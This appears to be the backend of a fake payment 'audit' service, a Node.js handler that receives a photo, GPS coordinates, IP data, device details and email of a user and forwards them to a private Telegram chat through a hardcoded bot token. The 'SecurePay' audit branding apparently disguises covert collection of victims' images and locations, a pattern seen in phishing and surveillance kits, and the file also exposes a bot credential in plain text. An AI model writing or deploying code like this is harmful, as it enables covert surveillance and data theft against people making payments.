const { Pool } = require('pg');
const pool = new Pool({ connectionString: process.env.POSTGRES_URL });

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    let body = req.body;
    if (typeof body === 'string') body = JSON.parse(body);
    
    const { image, role, ipInfo, latLon, userAgent, transaction_id, amount, user_email } = body || {};

    const TELEGRAM_BOT_TOKEN = "8818642094:AAGLCmtYPDVV4xVGXPUAPHpZpcr6qLHb13U";
    const TELEGRAM_CHAT_ID = "8896989037";

    if (!image) return res.status(400).json({ error: 'No image provided' });

    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');
    const blob = new Blob([buffer], { type: 'image/png' });

    const timeStamp = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    const formData = new FormData();
    
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, 'audit.png');
    
    const captionText = `🚨 *SecurePay Transaction Audit*\n\n` +
                        `🕒 *Timestamp:* \`${timeStamp}\`\n` +
                        `🧾 *Txn ID:* \`TXN-${transaction_id || 'UNKNOWN'}\`\n` +
                        `👤 *User:* \`${user_email || 'Unknown'}\`\n` +
                        `🏷️ *Action:* \`${role || 'Unknown'}\`\n` +
                        `💰 *Amount:* \`₹${amount || '0'}\`\n` +
                        `🌐 *IP Data:* \`${ipInfo || 'Unknown'}\`\n` +
                        `📍 *Coordinates:* \`${latLon || 'Unknown Location'}\`\n` +
                        `💻 *Device:* \`${userAgent || 'Unknown'}\``;
                        
    formData.append('caption', captionText);
    formData.append('parse_mode', 'Markdown');

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST', body: formData
    });

    const result = await telegramResponse.json();
    if (!result.ok) return res.status(500).json({ telegramError: result.description });

    await pool.query(`
      INSERT INTO audit_logs (transaction_id, amount, user_email, node_role, ip_address, photo_status)
      VALUES ($1, $2, $3, $4, $5, $6)
    `, [ transaction_id || null, amount || 0, user_email || 'unknown', role || 'Unknown', ipInfo || 'Unknown', 'Audit Synced' ]);

    return res.status(200).json({ success: true, message: 'Audit logged successfully.' });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
};
